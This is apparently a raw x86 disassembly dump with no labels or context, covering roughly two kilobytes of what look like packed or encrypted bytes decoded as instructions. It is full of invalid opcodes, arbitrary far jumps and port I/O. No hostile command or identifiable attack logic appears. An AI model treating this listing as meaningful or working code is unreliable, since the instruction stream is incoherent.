  4162ae:	xor    edx,esi
  4162b0:	mov    dh,BYTE PTR [ebx+ebx*2-0x5f89c276]
  4162b7:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162b9:	outs   dx,DWORD PTR ds:[esi]
  4162ba:	pop    edi
  4162bb:	imul   ebx,ebp,0xa07e61b6
  4162c1:	adc    ebx,0x5b
  4162c4:	inc    ecx
  4162c5:	pop    es
  4162c6:	mov    ah,BYTE PTR [esi-0x6f]
  4162c9:	nop
  4162ca:	push   edi
  4162cb:	cmp    edi,edi
  4162cd:	dec    esp
  4162ce:	daa    
  4162cf:	cmp    ecx,DWORD PTR [edi-0x52019a54]
  4162d5:	pushf  
  4162d6:	cmc    
  4162d7:	scas   al,BYTE PTR es:[edi]
  4162d8:	test   eax,0xda5827ba
  4162dd:	fs (bad) 
  4162df:	je     0x416324
  4162e1:	ret    
  4162e2:	xchg   DWORD PTR [edi+0x15b97aa6],edi
  4162e8:	sub    al,0xf6
  4162ea:	mov    dh,0xb1
  4162ec:	pop    ds
  4162ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162ee:	imul   esp,DWORD PTR [eax-0x28],0xffffffa9
  4162f2:	jmp    0x91d1:0x456d7b2f
  4162f9:	fs ror al,1
  4162fc:	push   ebx
  4162fd:	dec    edx
  4162fe:	sub    BYTE PTR [esi],bl
  416300:	sub    al,0x15
  416302:	scas   al,BYTE PTR es:[edi]
  416303:	aas    
  416304:	outs   dx,DWORD PTR ds:[esi]
  416305:	adc    al,0x1b
  416307:	mov    ch,0x79
  416309:	ins    BYTE PTR es:[edi],dx
  41630a:	ds (bad) 
  41630c:	repnz out 0x6,al
  41630f:	mov    al,0xd0
  416311:	mov    esi,0x405213b3
  416316:	outs   dx,BYTE PTR ds:[esi]
  416317:	mov    dl,0x41
  416319:	xchg   edx,eax
  41631a:	mov    DWORD PTR [ebp+0x2],edx
  41631d:	test   eax,0x754d205d
  416322:	jge    0x4162b3
  416324:	cmp    bl,BYTE PTR [esi]
  416326:	inc    eax
  416327:	mov    dh,0xa9
  416329:	cmp    BYTE PTR [ebp-0x58cf96c8],ch
  41632f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416330:	cmp    al,0x28
  416332:	sbb    al,0xe2
  416334:	pushf  
  416335:	aaa    
  416336:	xchg   edi,eax
  416337:	popf   
  416338:	sbb    BYTE PTR [ebp+0x3dcfca67],0xa4
  41633f:	(bad)  
  416341:	jne    0x416358
  416343:	lea    ecx,[edi+0x5c]
  416346:	and    al,0x8c
  416348:	lods   eax,DWORD PTR ds:[esi]
  416349:	mov    ch,0xf1
  41634b:	push   0x7ac2c657
  416350:	idiv   DWORD PTR [edi]
  416352:	outs   dx,DWORD PTR ds:[esi]
  416353:	sbb    ch,BYTE PTR [ebp+0x4e]
  416356:	or     ah,bl
  416358:	lea    eax,[edi+0x7a]
  41635b:	mov    bh,0x6f
  41635d:	jp     0x4163b2
  41635f:	ror    DWORD PTR [ebx+esi*1-0x6a],0x92
  416364:	xchg   ebp,eax
  416365:	(bad)  
  416367:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416368:	fnstcw WORD PTR [edi+0x6a556669]
  41636e:	xor    BYTE PTR [edx+0xfba014d],0x87
  416375:	into   
  416376:	xchg   ebp,eax
  416377:	jns    0x416358
  416379:	push   esi
  41637a:	ret    
  41637b:	jg     0x416349
  41637d:	das    
  41637e:	repnz aas 
  416380:	lock xchg ah,bh
  416383:	push   cx
  416385:	add    al,0xf0
  416387:	rol    cl,1
  416389:	nop
  41638a:	sbb    al,0xaf
  41638c:	loope  0x4163be
  41638e:	std    
  41638f:	enter  0x1c70,0x70
  416393:	push   ss
  416394:	mov    eax,0x9f182b14
  416399:	and    ah,BYTE PTR [eax]
  41639b:	(bad)  
  41639c:	gs pop ds
  41639e:	mov    bl,0x8b
  4163a0:	dec    edx
  4163a1:	mov    edx,DWORD PTR [edx-0x6b]
  4163a4:	ja     0x4163ae
  4163a6:	adc    eax,0x10b84689
  4163ab:	jmp    0xa9fb:0xcedab0c5
  4163b2:	lods   eax,DWORD PTR ds:[esi]
  4163b3:	icebp  
  4163b4:	pop    ss
  4163b5:	repnz aas 
  4163b7:	jl     0x416360
  4163b9:	jmp    0x2f74:0x400417f5
  4163c0:	xchg   ecx,eax
  4163c1:	mov    al,0xe
  4163c3:	xor    edx,ebx
  4163c5:	icebp  
  4163c6:	mov    eax,0x69e0bbc0
  4163cb:	cmp    dl,BYTE PTR [edi-0x7a4cdef4]
  4163d1:	rcr    BYTE PTR [eax+0x3e],cl
  4163d4:	ins    BYTE PTR es:[edi],dx
  4163d5:	jg     0x4163e0
  4163d7:	push   ss
  4163d8:	hlt    
  4163d9:	cwde   
  4163da:	xlat   BYTE PTR ds:[ebx]
  4163db:	pop    es
  4163dc:	fldcw  WORD PTR [esi+esi*1-0x2cbe6897]
  4163e3:	cmc    
  4163e4:	imul   esi,DWORD PTR [ecx+ebp*8+0x2510efe2],0xe6854de4
  4163ef:	pop    ss
  4163f0:	arpl   WORD PTR [ebp+esi*2-0x46c1c813],ax
  4163f7:	or     eax,0xb6fe0d86
  4163fc:	push   esi
  4163fd:	cmp    ebp,DWORD PTR ds:0x5073d566
  416403:	or     edi,DWORD PTR [ebx-0x326e2398]
  416409:	mul    bl
  41640b:	and    eax,0xa122c009
  416410:	test   eax,0xdb7e51c2
  416415:	jg     0x41639b
  416417:	mov    cl,al
  416419:	fst    QWORD PTR [ebp-0x4239a308]
  41641f:	call   0xb746:0x2664da53
  416426:	popa   
  416427:	xlat   BYTE PTR ds:[ebx]
  416428:	sahf   
  416429:	dec    edx
  41642a:	dec    ebp
  41642b:	cli    
  41642c:	sub    DWORD PTR [edx+0x215ecaf5],edi
  416432:	idiv   ecx
  416434:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416435:	pop    eax
  416436:	inc    ebp
  416437:	push   esp
  416438:	mov    esi,0x419c461e
  41643d:	scas   al,BYTE PTR es:[edi]
  41643e:	or     al,dl
  416440:	shr    DWORD PTR [edx],1
  416442:	and    DWORD PTR [ebx],edi
  416444:	enter  0x48ae,0xc1
  416448:	jb     0x41641b
  41644a:	ror    bh,1
  41644c:	repnz pop eax
  41644e:	icebp  
  41644f:	stos   BYTE PTR es:[edi],al
  416450:	pushf  
  416451:	add    cl,BYTE PTR [ecx]
  416453:	cmp    ch,BYTE PTR [edx-0x4749d13b]
  416459:	arpl   WORD PTR [ecx+edx*1],bp
  41645c:	push   edx
  41645d:	mov    edx,0xa28a1f71
  416462:	add    ebp,DWORD PTR [eax-0x203768e3]
  416468:	xchg   edi,eax
  416469:	ficom  WORD PTR [edi]
  41646b:	mov    al,ds:0x872f4e74
  416470:	xchg   ecx,eax
  416471:	dec    eax
  416472:	pop    esp
  416473:	int3   
  416474:	mov    ebp,0x87815a8e
  416479:	jge    0x4164e2
  41647b:	imul   ebp,DWORD PTR [ebx],0xffffff9f
  41647e:	mov    eax,0x696ebd6a
  416483:	jle    0x416437
  416485:	test   eax,ebx
  416487:	popa   
  416488:	pop    ecx
  416489:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41648a:	and    edi,eax
  41648c:	lahf   
  41648d:	dec    ebp
  41648e:	imul   ebp
  416490:	loope  0x416428
  416492:	pop    edx
  416493:	pop    eax
  416494:	rcr    BYTE PTR [edi+0x60],0x79
  416498:	add    dl,0x98
  41649b:	sub    eax,0x5a9a07b4
  4164a0:	or     DWORD PTR [eax-0x9],esp
  4164a3:	dec    eax
  4164a4:	xchg   ebp,eax
  4164a5:	inc    ecx
  4164a6:	dec    ebp
  4164a7:	repz add DWORD PTR [esi],ecx
  4164aa:	mov    edx,0xb19e64ac
  4164af:	fidivr DWORD PTR ds:0xba91daa8
  4164b5:	test   BYTE PTR [ebx+0x5eec13bf],ch
  4164bb:	xchg   esp,eax
  4164bc:	and    eax,0x47c5b35e
  4164c1:	rcr    ecx,0xf2
  4164c4:	addr16 test eax,0xad9f9603
  4164ca:	pop    eax
  4164cb:	cwde   
  4164cc:	mov    DWORD PTR [ebx-0x35994255],ecx
  4164d2:	push   esp
  4164d3:	bound  esp,QWORD PTR [eax]
  4164d5:	and    al,0xef
  4164d7:	cwde   
  4164d8:	das    
  4164d9:	adc    eax,0x7388b266
  4164de:	sahf   
  4164df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164e0:	scas   eax,DWORD PTR es:[edi]
  4164e1:	and    eax,0x1b342f84
  4164e6:	mov    cs,WORD PTR [eax+0x35]
  4164e9:	es xor al,0x2c
  4164ec:	mov    eax,ds:0xbe9b86a5
  4164f1:	add    BYTE PTR [ecx],ch
  4164f3:	ds or  eax,0x38c22022
  4164f9:	sbb    DWORD PTR [ebp-0x40],esi
  4164fc:	hlt    
  4164fd:	mov    edx,0xfe74c728
  416502:	jp     0x4164ee
  416504:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416505:	mov    dl,0x18
  416507:	sub    al,0x53
  416509:	sub    eax,0xb419a0f0
  41650e:	in     al,dx
  41650f:	adc    ecx,edi
  416511:	mov    edi,0x2f157a40
  416516:	fmul   QWORD PTR [ebx-0x2f]
  416519:	xlat   BYTE PTR ds:[ebx]
  41651a:	inc    BYTE PTR [edx]
  41651c:	outs   dx,DWORD PTR ds:[esi]
  41651d:	pop    edx
  41651e:	add    BYTE PTR [esi-0x4dc6b15f],cl
  416524:	mov    bl,0x0
  416526:	jb     0x4165a6
  416528:	mov    edx,0xd6d75748
  41652d:	or     esi,DWORD PTR [ecx-0x5b]
  416530:	add    bl,BYTE PTR [ebp+0x8751fdd]
  416536:	push   esi
  416537:	xor    ch,BYTE PTR [edi]
  416539:	xchg   BYTE PTR [eax+0x6e],bl
  41653c:	in     al,0x9c
  41653e:	pop    esp
  41653f:	push   ss
  416540:	push   ebp
  416541:	jb     0x416596
  416543:	or     ah,BYTE PTR [ebx+0x71]
  416546:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416547:	scas   al,BYTE PTR es:[edi]
  416548:	add    al,al
  41654a:	mov    ch,BYTE PTR [eax+0x7a]
  41654d:	stos   BYTE PTR es:[edi],al
  41654e:	and    esi,esi
  416550:	les    edx,FWORD PTR [eax+0x28]
  416553:	cmp    al,0xff
  416555:	xor    eax,0x68d76ef9
  41655a:	retf   
  41655b:	cmp    cl,BYTE PTR [ebx-0x2cf049c4]
  416561:	(bad)  
  416562:	(bad)  
  416563:	cld    
  416564:	sub    DWORD PTR [ecx+eax*1-0x72],esp
  416568:	pop    esp
  416569:	cmp    BYTE PTR [edi+0x6],bl
  41656c:	sub    ebp,DWORD PTR [ecx]
  41656e:	mov    esp,0x40f1febc
  416573:	dec    edx
  416574:	stc    
  416575:	lods   eax,DWORD PTR ds:[esi]
  416576:	cmp    DWORD PTR [ebx],edx
  416578:	pop    edx
  416579:	adc    al,0x70
  41657b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41657c:	mov    ch,0xa
  41657e:	mov    ds:0xdff0e526,al
  416583:	sar    DWORD PTR [ebx],0x48
  416586:	test   al,0x54
  416588:	add    dh,dh
  41658a:	ja     0x4165de
  41658c:	aaa    
  41658d:	sar    BYTE PTR [ebx+edx*1-0x4c],cl
  416591:	jmp    0x33005ab3
  416596:	test   DWORD PTR [edx+eax*4-0x70],ecx
  41659a:	jp     0x416526
  41659c:	adc    al,0xb0
  41659e:	rcr    DWORD PTR [ebp+0x5],1
  4165a1:	into   
  4165a2:	jmp    0xba:0xaf7bfc2e
  4165a9:	bound  eax,QWORD PTR [esi+0x8d834b7]
  4165af:	sbb    edi,DWORD PTR [edi-0x29]
  4165b2:	jmp    0x3476:0xcfca4363
  4165b9:	hlt    
  4165ba:	data16 jno 0x416605
  4165bd:	cmp    BYTE PTR [esi-0x8],dl
  4165c0:	and    DWORD PTR [edx-0x7],esp
  4165c3:	dec    edi
  4165c4:	out    dx,eax
  4165c5:	dec    ebx
  4165c6:	xor    ah,BYTE PTR [eax]
  4165c8:	aas    
  4165c9:	jno    0x416595
  4165cb:	sub    DWORD PTR [ebx+edx*4+0x69ff96ba],0xffffffdf
  4165d3:	cld    
  4165d4:	les    eax,FWORD PTR [esi-0x18a05af5]
  4165da:	icebp  
  4165db:	pop    eax
  4165dc:	inc    ebx
  4165dd:	push   ebx
  4165de:	mov    ah,BYTE PTR [ecx-0x64]
  4165e1:	lea    esi,[esi-0x4e]
  4165e4:	jle    0x41659e
  4165e6:	loop   0x41662d
  4165e8:	sbb    edx,esi
  4165ea:	inc    DWORD PTR [edi+0x1b1780c1]
  4165f0:	fmul   QWORD PTR [edx+0x4a]
  4165f3:	sbb    al,0xf5
  4165f5:	xchg   edi,eax
  4165f6:	aaa    
  4165f7:	dec    ebx
  4165f8:	loopne 0x4165a8
  4165fa:	aas    
  4165fb:	push   0x7c
  4165fd:	mov    eax,0xcb527582
  416602:	loop   0x416631
  416604:	xlat   BYTE PTR ds:[ebx]
  416605:	sahf   
  416606:	ret    
  416607:	ins    DWORD PTR es:[edi],dx
  416608:	cdq    
  416609:	retf   
  41660a:	jns    0x41661d
  41660c:	cld    
  41660d:	popf   
  41660e:	add    al,0x8e
  416610:	ins    DWORD PTR es:[edi],dx
  416611:	iret   
  416612:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416613:	aad    0x4a
  416615:	dec    edi
  416616:	adc    BYTE PTR [ecx+0x0],al
  416619:	cli    
  41661a:	gs aam 0xac
  41661d:	sbb    BYTE PTR [ecx],0xf6
  416620:	pop    ebp
  416621:	or     bh,BYTE PTR [ebx+0x108ba3c5]
  416627:	pop    edi
  416628:	adc    bh,cl
  41662a:	adc    dl,BYTE PTR [edi+esi*2]
  41662d:	ss js  0x416651
  416630:	aas    
  416631:	inc    esp
  416632:	mov    ebp,0x9d1b838b
  416637:	iret   
  416638:	leave  
  416639:	push   cs
  41663a:	mov    DWORD PTR [ecx],esi
  41663c:	imul   esp,DWORD PTR [eax],0xffffffff
  41663f:	jns    0x416670
  416641:	push   ecx
  416642:	xor    eax,0x3714f4fe
  416647:	mov    ebp,0x295b89e8
  41664c:	mov    al,BYTE PTR [esp]
  41664f:	jl     0x4165e1
  416651:	iret   
  416652:	aad    0x43
  416654:	fwait
  416655:	retf   0x947f
  416658:	mov    eax,0x4671bf4b
  41665d:	xchg   ch,ah
  41665f:	or     eax,0xcce89c9c
  416664:	into   
  416665:	out    0xc0,al
  416667:	leave  
  416668:	rcr    DWORD PTR [ecx+0x223d8129],0x94
  41666f:	icebp  
  416670:	neg    DWORD PTR [edi+0x60]
  416673:	adc    dl,0x81
  416676:	out    dx,eax
  416677:	mov    ebp,0x5119dabe
  41667c:	adc    ebx,0x3
  41667f:	mov    ds:0x4d44030d,al
  416684:	stc    
  416685:	test   BYTE PTR [edi+0x6d],dh
  416688:	jno    0x4166e6
  41668a:	lahf   
  41668b:	js     0x416627
  41668d:	sub    al,BYTE PTR [eax+0x1e]
  416690:	mov    bl,0xf7
  416692:	pop    DWORD PTR [esi+0x31]
  416695:	not    ebx
  416697:	jle    0x41664e
  416699:	fistp  QWORD PTR [ebx]
  41669b:	or     eax,0xefe1879a
  4166a0:	fcomp  DWORD PTR [eax-0x835b1dc]
  4166a6:	xchg   esp,eax
  4166a7:	inc    eax
  4166a8:	in     al,dx
  4166a9:	loop   0x416664
  4166ab:	ins    BYTE PTR es:[edi],dx
  4166ac:	lahf   
  4166ad:	out    0x8c,eax
  4166af:	loope  0x41671c
  4166b1:	cwde   
  4166b2:	jmp    0x20ec:0xf282c5e3
  4166b9:	cmp    BYTE PTR [eax],ch
  4166bb:	retf   
  4166bc:	mov    bh,0xe3
  4166be:	and    bh,BYTE PTR [ebx+esi*4]
  4166c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166c2:	iret   
  4166c3:	xlat   BYTE PTR ds:[ebx]
  4166c4:	push   0x866b4746
  4166c9:	xchg   ebp,eax
  4166ca:	aaa    
  4166cb:	addr16 aad 0x32
  4166ce:	pusha  
  4166cf:	dec    ecx
  4166d0:	lock shl eax,1
  4166d3:	fild   WORD PTR [esi+0x18]
  4166d6:	mov    ecx,0xdc8a7785
  4166db:	mov    eax,0xa371c074
  4166e0:	mov    esp,0x611e301a
  4166e5:	mov    al,ds:0xc83bb5c1
  4166ea:	jnp    0x41670c
  4166ec:	int3   
  4166ed:	cmp    al,0x1e
  4166ef:	jge    0x416761
  4166f1:	xchg   DWORD PTR [edx],edi
  4166f3:	mov    dh,0xa4
  4166f5:	stc    
  4166f6:	mov    al,ds:0x2273681e
  4166fb:	jle    0x41669d
  4166fd:	je     0x41668c
  4166ff:	cld    
  416700:	push   ecx
  416701:	add    DWORD PTR [edi+edx*4+0x3628eb02],ecx
  416708:	dec    esi
  416709:	xor    BYTE PTR [eax],al
  41670b:	loop   0x41672e
  41670d:	sbb    eax,ebp
  41670f:	scas   eax,DWORD PTR es:[edi]
  416710:	rcr    DWORD PTR [ebx+ebp*4],cl
  416713:	push   es
  416714:	xchg   esp,eax
  416715:	bound  esp,QWORD PTR [ebx-0x29c467ce]
  41671b:	ror    DWORD PTR [eax+edi*4],0x68
  41671f:	fisubr WORD PTR [eax]
  416721:	lods   al,BYTE PTR ds:[esi]
  416722:	lds    edi,FWORD PTR [ebx-0x1644d81a]
  416728:	pop    eax
  416729:	lods   eax,DWORD PTR ds:[esi]
  41672a:	iret   
  41672b:	jne    0x41670c
  41672d:	pusha  
  41672e:	xor    ecx,DWORD PTR [edx]
  416730:	pusha  
  416731:	mov    esp,0x9003a5a3
  416736:	sub    al,0x4f
  416738:	add    ah,BYTE PTR [esi+0x2]
  41673b:	mov    WORD PTR [eax-0x30],gs
  41673e:	cdq    
  41673f:	sub    cl,BYTE PTR [esp+edx*2+0x53674f6b]
  416746:	dec    edi
  416747:	shr    BYTE PTR [ecx],cl
  416749:	test   eax,0xfcf02ebb
  41674e:	sbb    BYTE PTR [eax+ecx*1+0xf549044],dh
  416755:	test   BYTE PTR [ebp+0x69753370],al
  41675b:	gs stc 
  41675d:	cdq    
  41675e:	fnstcw WORD PTR [eax+edx*1+0x31913583]
  416765:	add    cl,0x70
  416768:	dec    ebp
  416769:	mov    ebx,0x34e82da0
  41676e:	jmp    0xfb5c:0x1bd9877f
  416775:	cli    
  416776:	jnp    0x41671b
  416778:	pop    ds
  416779:	jns    0x416735
  41677b:	xchg   BYTE PTR [edi+eax*1-0x7d63feee],bl
  416782:	and    BYTE PTR [eax],ah
  416784:	arpl   WORD PTR [edi-0x29805054],ax
  41678a:	test   BYTE PTR [esi+0x2],dh
  41678d:	outs   dx,DWORD PTR ds:[esi]
  41678e:	pop    ss
  41678f:	lods   eax,DWORD PTR ds:[esi]
  416790:	xor    ecx,DWORD PTR [ebx]
  416792:	(bad)
  416796:	(bad)  
  416797:	jp     0x4167ad
  416799:	mov    bl,0xa2
  41679b:	aas    
  41679c:	mov    ch,0x8
  41679e:	push   0xffffffcb
  4167a0:	dec    esi
  4167a1:	or     esp,DWORD PTR [edi]
  4167a3:	dec    ecx
  4167a4:	jmp    0x428faeb4
  4167a9:	add    al,0x6f
  4167ab:	aas    
  4167ac:	inc    esi
  4167ad:	cmp    eax,0x1efb025f
  4167b2:	jbe    0x41677d
  4167b4:	adc    al,0xdc
  4167b6:	je     0x4167fc
  4167b8:	mov    ds:0xb5310982,al
  4167bd:	sar    BYTE PTR [edi],cl
  4167bf:	out    0x8a,al
  4167c1:	clc    
  4167c2:	int    0x2d
  4167c4:	mov    bl,0xce
  4167c6:	das    
  4167c7:	loop   0x41676b
  4167c9:	shl    edx,1
  4167cb:	ins    BYTE PTR es:[edi],dx
  4167cc:	std    
  4167cd:	clc    
  4167ce:	xor    eax,0xd10bd3b2
  4167d3:	fnsave [ebx]
  4167d5:	fsubr  DWORD PTR [eax-0x3e]
  4167d8:	fild   QWORD PTR [edx]
  4167da:	repz cmp bh,ah
  4167dd:	mov    ds:0x817297b3,eax
  4167e2:	ins    BYTE PTR es:[edi],dx
  4167e3:	test   al,0x41
  4167e5:	mov    cl,0xa
  4167e7:	inc    esp
  4167e8:	xor    eax,0xabc1a54c
  4167ed:	mov    ds:0x3c2f237,al
  4167f2:	daa    
  4167f3:	jecxz  0x4167da
  4167f5:	sub    edx,DWORD PTR [ebp-0x32]
  4167f8:	inc    esi
  4167f9:	jmp    0x77a3:0xbab8c444
  416800:	or     BYTE PTR [esi],0xb0
  416803:	mov    al,BYTE PTR [edi+ecx*1]
  416806:	leave  
  416807:	jg     0x416858
  416809:	retf   0x91f1
  41680c:	or     al,0x15
  41680e:	(bad)  
  41680f:	xor    eax,0xfd28bd27
  416814:	stc    
  416815:	stos   BYTE PTR es:[edi],al
  416816:	shr    dh,cl
  416818:	jns    0x4167c3
  41681a:	push   esp
  41681b:	retf   
  41681c:	xor    BYTE PTR [edx+0xc],cl
  41681f:	add    al,BYTE PTR [edi+ebp*4]
  416822:	jge    0x416878
  416824:	cwde   
  416825:	mov    bh,0xdb
  416827:	sub    DWORD PTR [edi],ebx
  416829:	mov    dh,ah
  41682b:	jno    0x416817
  41682d:	scas   al,BYTE PTR es:[edi]
  41682e:	enter  0x7b39,0x71
  416832:	retf   
  416833:	xor    al,0xf3
  416835:	stos   DWORD PTR es:[edi],eax
  416836:	dec    eax
  416837:	sbb    BYTE PTR [edx+0x44190098],al
  41683d:	popa   
  41683e:	mov    ds:0x10385ea3,al
  416843:	pop    esi
  416844:	aam    0x78
  416846:	cmp    al,0x80
  416848:	push   ebx
  416849:	cwde   
  41684a:	std    
  41684b:	mov    ecx,esp
  41684d:	sbb    DWORD PTR [eax],esp
  41684f:	fisttp DWORD PTR [esi]
  416851:	or     ebp,esi
  416853:	stos   BYTE PTR es:[edi],al
  416854:	rol    DWORD PTR [esi+0x3e],0xe3
  416858:	jl     0x4167f8
  41685a:	mul    BYTE PTR [eax+0x78]
  41685d:	shl    ch,cl
  41685f:	and    al,0xb3
  416861:	repnz shr BYTE PTR ds:0x65136182,1
  416868:	inc    ebx
  416869:	cdq    
  41686a:	mov    esi,0x2ff1a602
  41686f:	cmp    BYTE PTR [eax],dl
  416871:	cmp    ebx,ecx
  416873:	cmp    bl,0x4e
  416876:	leave  
  416877:	pusha  
  416878:	xor    al,0x58
  41687a:	jl     0x4168f7
  41687c:	push   edx
  41687d:	pop    ss
  41687e:	arpl   dx,bp
  416880:	ins    DWORD PTR es:[edi],dx
  416881:	hlt    
  416882:	push   ebx
  416883:	dec    eax
  416884:	sbb    bl,bl
  416886:	fcom   QWORD PTR [ebx+0x2a84fd5f]
  41688c:	inc    esi
  41688d:	aaa    
  41688e:	cli    
  41688f:	pop    esp
  416890:	jns    0x416822
  416892:	xor    al,0x51
  416894:	xor    BYTE PTR [ebx+0x33],ch
  416897:	pusha  
  416898:	sub    ecx,ebp
  41689a:	xor    DWORD PTR [eax],edi
  41689c:	pop    ebp
  41689d:	adc    edi,0x7ea71432
  4168a3:	test   DWORD PTR [ecx-0x4351a9d0],ecx
  4168a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168aa:	xchg   edi,eax
  4168ab:	jb     0x416847
  4168ad:	push   ebx
  4168ae:	xchg   edx,eax
  4168af:	cdq    
  4168b0:	add    al,0xb2
  4168b2:	and    esi,esp
  4168b4:	and    BYTE PTR [ebx+0x29a9e79f],cl
  4168ba:	cmc    
  4168bb:	lahf   
  4168bc:	dec    ecx
  4168bd:	iret   
  4168be:	sbb    eax,0xd1f10f71
  4168c3:	sub    eax,0xd4b85b4
  4168c8:	arpl   WORD PTR [esi-0x6a],ax
  4168cb:	jg     0x4168d8
  4168cd:	jo     0x416895
  4168cf:	repnz xchg esp,eax
  4168d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168d2:	sub    eax,0xb3e50aa
  4168d7:	adc    BYTE PTR [ecx-0x78],dh
  4168da:	xor    DWORD PTR [ebx-0x143727d],0xffffffcf
  4168e1:	dec    eax
  4168e2:	and    BYTE PTR [eax+esi*1-0x60b75667],cl
  4168e9:	shl    BYTE PTR [eax+0x69e01e9a],0xf4
  4168f0:	xor    al,0x78
  4168f2:	add    al,0xb8
  4168f4:	ror    BYTE PTR [ebp+ecx*1+0x7e],1
  4168f8:	shl    DWORD PTR [eax],cl
  4168fa:	sub    ch,BYTE PTR [esi+0x43be9181]
  416900:	jo     0x41695a
  416902:	mov    bh,0x90
  416904:	cli    
  416905:	add    BYTE PTR [ebp+0x27],al
  416908:	or     DWORD PTR [ecx],ebp
  41690a:	mov    ds:0x15ad7dd7,eax
  41690f:	fisttp DWORD PTR [ecx+esi*1+0x26]
  416913:	pop    edi
  416914:	adc    BYTE PTR [edi+0x10],dh
  416917:	jmp    0x1cca:0x43f365dd
  41691e:	mov    al,0x14
  416920:	(bad)  
  416921:	jne    0x416900
  416923:	test   al,0x9c
  416925:	addr16 jmp 0x172d2409
  41692b:	and    bh,BYTE PTR [ebp+0x1ea8714]
  416931:	mov    edi,ecx
  416933:	cmp    DWORD PTR [edx],edx
  416935:	or     dl,dl
  416937:	(bad)  
  416938:	sub    al,0xb4
  41693a:	mov    bh,0x2a
  41693c:	lea    edx,[eax]
  41693e:	aas    
  41693f:	(bad)  
  416940:	mov    bh,0xd4
  416942:	jge    0x41695d
  416944:	add    al,0x5f
  416946:	repz push ebx
  416948:	cmp    esi,DWORD PTR [ebp-0x22]
  41694b:	add    esi,DWORD PTR [ebx-0x6b0a30ca]
  416951:	out    0xc4,eax
  416953:	xlat   BYTE PTR ds:[ebx]
  416954:	xlat   BYTE PTR ds:[ebx]
  416955:	xor    DWORD PTR [edi+0x22d47abb],esi
  41695b:	mov    al,0x7c
  41695d:	les    edx,FWORD PTR [ebx+0x0]
  416960:	mov    bl,0xd0
  416962:	pop    ecx
  416963:	mov    ebx,0x22a7c4f8
  416968:	mov    cl,0xea
  41696a:	imul   ebx,ecx,0x25
  41696d:	mov    cl,0xd5
  41696f:	(bad)  [eax]
  416971:	cmp    DWORD PTR [edx+0x35],eax
  416974:	dec    ebx
  416975:	sub    eax,0x9096f727
  41697a:	jge    0x4169d7
  41697c:	pusha  
  41697d:	push   edi
  41697e:	pop    ss
  41697f:	fmul   DWORD PTR [edx+0xd]
  416982:	push   ebp
  416983:	add    edi,0x61ff3491
  416989:	push   esi
  41698a:	dec    ebx
  41698b:	push   ecx
  41698c:	ja     0x4169b8
  41698e:	cwde   
  41698f:	mov    al,ds:0xc9629845
  416994:	ret    
  416995:	sahf   
  416996:	arpl   WORD PTR [eax+esi*4],sp
  416999:	lods   al,BYTE PTR ds:[esi]
  41699a:	lea    ebp,ds:0x54820e06
  4169a0:	rcl    DWORD PTR [ebx],cl
  4169a2:	pop    ss
  4169a3:	js     0x4169bc
  4169a5:	inc    ecx
  4169a6:	outs   dx,BYTE PTR ds:[esi]
  4169a7:	sar    DWORD PTR [eax],cl
  4169a9:	test   dl,bh
  4169ab:	add    al,BYTE PTR [esi-0x2a58f807]
  4169b1:	cli    
  4169b2:	outs   dx,BYTE PTR ds:[esi]
  4169b3:	mov    bl,0xc4
  4169b5:	mov    BYTE PTR [ecx+edx*2],bl
  4169b8:	lahf   
  4169b9:	std    
  4169ba:	call   DWORD PTR [eax-0x2d]
  4169bd:	xor    BYTE PTR [ecx],ch
  4169bf:	sub    ch,BYTE PTR [edi+ebx*4]
  4169c2:	enter  0xe3cb,0x8b
  4169c6:	jb     0x41694e
  4169c8:	sub    eax,0x8c73f924
  4169cd:	sub    ah,cl
  4169cf:	cmp    BYTE PTR [ebx-0x4f433f24],dh
  4169d5:	sbb    BYTE PTR [esi-0x3b],dl
  4169d8:	mov    eax,?
  4169da:	xor    eax,0x5553305c
  4169df:	vpcmpeqw ymm6,ymm0,YMMWORD PTR [esp+eax*1+0x766fbe35]
  4169e8:	push   ebp
  4169e9:	inc    ecx
  4169ea:	sahf   
  4169eb:	fs xchg esp,esi
  4169ee:	aas    
  4169ef:	lea    ecx,[ebp-0x5139f16a]
  4169f5:	or     al,0x24
  4169f7:	inc    ecx
  4169f8:	mov    WORD PTR [edi+0x76],cs
  4169fb:	jecxz  0x4169ae
  4169fd:	out    0x42,eax
  4169ff:	and    dh,ah
  416a01:	jp     0x416a6b
  416a03:	add    bl,al
  416a05:	cmc    
  416a06:	jmp    0x97e9d21a
  416a0b:	pop    esi
  416a0c:	jnp    0x4169a4
  416a0e:	outs   dx,DWORD PTR ds:[esi]
  416a0f:	push   es
  416a10:	jb     0x4169a0
  416a12:	fwait
  416a13:	pop    ss
  416a14:	mov    eax,ds:0xfcf982be
  416a19:	adc    al,0x40
  416a1b:	mov    BYTE PTR [ecx],bl
  416a1d:	out    0x93,eax
  416a1f:	jne    0x4169e9
  416a21:	jp     0xad7dfcf6
  416a27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a28:	in     eax,0xd0
  416a2a:	mov    dl,0x91
  416a2c:	push   edi
  416a2d:	ja     0x416a90
  416a2f:	ja     0x416a7b
  416a31:	mov    dh,BYTE PTR [ecx-0x1e74b352]
  416a37:	repnz xchg esi,eax
  416a39:	jne    0x4169f2
  416a3b:	sbb    al,0x98
  416a3d:	enter  0xad8e,0x3d
  416a41:	mov    ecx,DWORD PTR ds:0x8c51dbda
  416a47:	mov    esi,0xff4abb11
  416a4c:	rcr    BYTE PTR [edx+eax*1+0x102ed968],0x16
  416a54:	xchg   esp,eax
  416a55:	mov    edx,0x475cb9c1
  416a5a:	pop    ebp
  416a5b:	or     al,bl
  416a5d:	in     eax,0x32
  416a5f:	imul   ebp,DWORD PTR [eax],0x476fb18a
  416a65:	aaa    
